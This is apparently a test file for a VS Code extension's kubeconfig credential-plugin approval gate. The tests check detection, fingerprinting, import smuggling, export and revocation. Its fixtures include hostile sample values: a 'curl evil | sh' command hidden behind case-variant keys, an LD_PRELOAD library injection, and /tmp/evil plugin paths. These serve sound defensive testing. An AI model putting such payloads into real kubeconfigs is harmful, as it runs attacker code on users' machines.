import * as assert from 'assert';
import { ClusterStore, ClusterProfile } from '../../store';
import { analyzeKubeconfig, isKubeconfigAllowed, assertKubeconfigAllowed, syncApprovedFingerprints, revokeExecTrust } from '../../execTrust';
import type * as vscode from 'vscode';

// ---------------------------------------------------------------------------
// Fake SecretStorage backed by a plain Map (same approach as store.test.ts).
// ---------------------------------------------------------------------------
class FakeSecretStorage implements vscode.SecretStorage {
    private readonly _map = new Map<string, string>();
    readonly onDidChange: vscode.Event<vscode.SecretStorageChangeEvent> = (_listener: any) => ({
        dispose: () => { /* noop */ },
    }) as vscode.Disposable;
    async get(key: string): Promise<string | undefined> { return this._map.get(key); }
    async store(key: string, value: string): Promise<void> { this._map.set(key, value); }
    async delete(key: string): Promise<void> { this._map.delete(key); }
    async keys(): Promise<string[]> { return [...this._map.keys()]; }
}

function makeContext(secrets: vscode.SecretStorage): vscode.ExtensionContext {
    return { secrets } as unknown as vscode.ExtensionContext;
}

const STORAGE_KEY = 'kubectl-control.clusters';

const PLAIN = 'apiVersion: v1\nkind: Config\nclusters: []\ncontexts: []\nusers:\n- name: u\n  user:\n    token: abc\n';

function withExec(command: string, args: string[] = []): string {
    return [
        'apiVersion: v1',
        'kind: Config',
        'users:',
        '- name: u',
        '  user:',
        '    exec:',
        '      apiVersion: client.authentication.k8s.io/v1beta1',
        `      command: ${command}`,
        `      args: [${args.map(a => JSON.stringify(a)).join(', ')}]`,
        '',
    ].join('\n');
}

suite('execTrust', () => {

    teardown(() => syncApprovedFingerprints([]));

    test('analyze: kubeconfig without plugin has no fingerprint', () => {
        const a = analyzeKubeconfig(PLAIN);
        assert.strictEqual(a.entries.length, 0);
        assert.strictEqual(a.fingerprint, undefined);
        assert.ok(isKubeconfigAllowed(PLAIN));
    });

    test('analyze: exec plugin is detected with its command line', () => {
        const a = analyzeKubeconfig(withExec('aws', ['eks', 'get-token']));
        assert.strictEqual(a.entries.length, 1);
        assert.strictEqual(a.entries[0].kind, 'exec');
        assert.strictEqual(a.entries[0].summary, 'aws eks get-token');
        assert.ok(a.fingerprint);
    });

    test('analyze: key casing cannot hide a plugin (kubectl matches case-insensitively)', () => {
        const yaml = withExec('evil').replace('    exec:', '    EXEC:');
        assert.ok(analyzeKubeconfig(yaml).fingerprint);
    });

    test('analyze: auth-provider cmd-path is detected; refreshed tokens keep the fingerprint', () => {
        const base = (token: string) => [
            'apiVersion: v1', 'kind: Config', 'users:', '- name: u', '  user:', '    auth-provider:',
            '      name: gcp', '      config:', '        cmd-path: /usr/bin/gcloud',
            `        access-token: ${token}`, '',
        ].join('\n');
        const a = analyzeKubeconfig(base('t1'));
        assert.strictEqual(a.entries[0].kind, 'auth-provider');
        assert.ok(a.entries[0].summary.includes('/usr/bin/gcloud'));
        assert.strictEqual(a.fingerprint, analyzeKubeconfig(base('t2')).fingerprint);
    });

    test('analyze: different command or args give a different fingerprint', () => {
        const f1 = analyzeKubeconfig(withExec('aws', ['eks', 'get-token'])).fingerprint;
        assert.notStrictEqual(f1, analyzeKubeconfig(withExec('aws', ['eks', 'get-token', '--x'])).fingerprint);
        assert.notStrictEqual(f1, analyzeKubeconfig(withExec('/tmp/evil', ['eks', 'get-token'])).fingerprint);
    });

    test('analyze: unparseable kubeconfig requires approval', () => {
        const a = analyzeKubeconfig('a: [unclosed');
        assert.strictEqual(a.entries[0].kind, 'unparseable');
        assert.ok(a.fingerprint);
    });

    test('display: case-variant duplicate keys are flagged and the exact-case command is shown', () => {
        // kubectl (client-go >= 1.23) reads keys case-sensitively and would run `sh`, not `aws`.
        const yaml = [
            'apiVersion: v1', 'kind: Config', 'users:', '- name: u', '  user:', '    exec:',
            '      Command: aws', '      Args: [eks, get-token]',
            '      command: sh', '      args: [-c, "curl evil | sh"]', '',
        ].join('\n');
        const a = analyzeKubeconfig(yaml);
        assert.strictEqual(a.ambiguous, true);
        assert.ok(a.entries[0].summary.startsWith('sh -c'), a.entries[0].summary);
    });

    test('display: env is shown and control characters are made visible', () => {
        const yaml = [
            'apiVersion: v1', 'kind: Config', 'users:', '- name: u', '  user:', '    exec:',
            '      command: aws', '      args: ["a\\nb"]',
            '      env: [{name: LD_PRELOAD, value: /tmp/x.so}]', '',
        ].join('\n');
        const a = analyzeKubeconfig(yaml);
        assert.ok(!a.ambiguous);
        assert.ok(a.entries[0].summary.includes('LD_PRELOAD=/tmp/x.so'));
        assert.ok(!a.entries[0].summary.includes('\n'));
    });

    test('fingerprint: auth-provider with case-variant keys does not collide with a stock one', () => {
        const mk = (cfg: string) => [
            'apiVersion: v1', 'kind: Config', 'users:', '- name: u', '  user:', '    auth-provider:',
            '      name: gcp', `      config: ${cfg}`, '',
        ].join('\n');
        const stock = analyzeKubeconfig(mk('{}'));
        const evil = analyzeKubeconfig(mk('{Cmd-Path: null, cmd-path: /tmp/evil}'));
        assert.notStrictEqual(stock.fingerprint, evil.fingerprint);
        assert.strictEqual(evil.ambiguous, true);
    });

    test('gate: unapproved plugin is refused, approved plugin is allowed', () => {
        const yaml = withExec('aws', ['eks', 'get-token']);
        assert.throws(() => assertKubeconfigAllowed(yaml), /credential plugin/);
        const fp = analyzeKubeconfig(yaml).fingerprint!;
        syncApprovedFingerprints([{ id: 'x', name: 'x', kubeconfigData: yaml, execTrust: fp }]);
        assert.doesNotThrow(() => assertKubeconfigAllowed(yaml));
    });

    test('migration v1 → v2: existing plugin clusters stay usable after the update', async () => {
        const storage = new FakeSecretStorage();
        const clusters: ClusterProfile[] = [
            { id: 'aaaaaaaa-aaaa-4aaa-aaaa-aaaaaaaaaaaa', name: 'eks', kubeconfigData: withExec('aws', ['eks', 'get-token']) },
            { id: 'bbbbbbbb-bbbb-4bbb-bbbb-bbbbbbbbbbbb', name: 'plain', kubeconfigData: PLAIN },
        ];
        await storage.store(STORAGE_KEY, JSON.stringify({ schemaVersion: 1, clusters }));

        const store = new ClusterStore(makeContext(storage));
        const loaded = await store.getClusters();
        assert.ok(loaded[0].execTrust, 'existing exec cluster is approved by the migration');
        assert.strictEqual(loaded[1].execTrust, undefined);
        assert.ok(isKubeconfigAllowed(loaded[0].kubeconfigData));

        // Migration is persisted so it runs exactly once.
        const persisted = JSON.parse((await storage.get(STORAGE_KEY))!);
        assert.strictEqual(persisted.schemaVersion, 2);
        assert.strictEqual(persisted.clusters[0].execTrust, loaded[0].execTrust);
    });

    test('migration: legacy bare-array storage is migrated and approved too', async () => {
        const storage = new FakeSecretStorage();
        const clusters: ClusterProfile[] = [
            { id: 'cccccccc-cccc-4ccc-cccc-cccccccccccc', name: 'gke', kubeconfigData: withExec('gke-gcloud-auth-plugin') },
        ];
        await storage.store(STORAGE_KEY, JSON.stringify(clusters));
        const loaded = await new ClusterStore(makeContext(storage)).getClusters();
        assert.ok(loaded[0].execTrust);
    });

    test('import: an approval can never be smuggled in via import / Gist', async () => {
        const store = new ClusterStore(makeContext(new FakeSecretStorage()));
        const yaml = withExec('/tmp/evil');
        const incoming = [{
            id: 'dddddddd-dddd-4ddd-dddd-dddddddddddd', name: 'evil', kubeconfigData: yaml,
            execTrust: analyzeKubeconfig(yaml).fingerprint,
        }];
        await store.importClusters(JSON.stringify(incoming));
        const loaded = await store.getClusters();
        assert.strictEqual(loaded[0].execTrust, undefined);
        assert.ok(!isKubeconfigAllowed(yaml));
    });

    test('import over an existing id: changed plugin command is blocked again', async () => {
        const store = new ClusterStore(makeContext(new FakeSecretStorage()));
        const good = withExec('aws', ['eks', 'get-token']);
        const p = await store.addCluster({ name: 'eks', kubeconfigData: good, execTrust: analyzeKubeconfig(good).fingerprint });
        const evil = withExec('/tmp/evil');
        await store.importClusters(JSON.stringify([{ id: p.id, name: 'eks', kubeconfigData: evil }]));
        const loaded = await store.getClusters();
        assert.strictEqual(loaded.length, 1);
        assert.ok(!isKubeconfigAllowed(loaded[0].kubeconfigData));
    });

    test('export: approvals are never exported', async () => {
        const store = new ClusterStore(makeContext(new FakeSecretStorage()));
        const good = withExec('aws');
        await store.addCluster({ name: 'eks', kubeconfigData: good, execTrust: analyzeKubeconfig(good).fingerprint });
        assert.ok(!(await store.exportClusters()).includes('execTrust'));
    });

    test('revoke: removes the approval from every connection with the same command', async () => {
        const store = new ClusterStore(makeContext(new FakeSecretStorage()));
        const yaml = withExec('aws', ['eks', 'get-token']);
        const fp = analyzeKubeconfig(yaml).fingerprint!;
        const other = withExec('gke-gcloud-auth-plugin');
        const otherFp = analyzeKubeconfig(other).fingerprint!;
        await store.addCluster({ name: 'eks-a', kubeconfigData: yaml, execTrust: fp });
        await store.addCluster({ name: 'eks-b', kubeconfigData: yaml, execTrust: fp });
        await store.addCluster({ name: 'gke', kubeconfigData: other, execTrust: otherFp });
        assert.ok(isKubeconfigAllowed(yaml));

        const revoked = await revokeExecTrust(store, fp);
        assert.deepStrictEqual(revoked.sort(), ['eks-a', 'eks-b']);
        assert.ok(!isKubeconfigAllowed(yaml), 'revoked command is blocked again');
        assert.ok(isKubeconfigAllowed(other), 'unrelated approval is untouched');
        const loaded = await store.getClusters();
        assert.strictEqual(loaded.find(c => c.name === 'gke')!.execTrust, otherFp);
    });
});
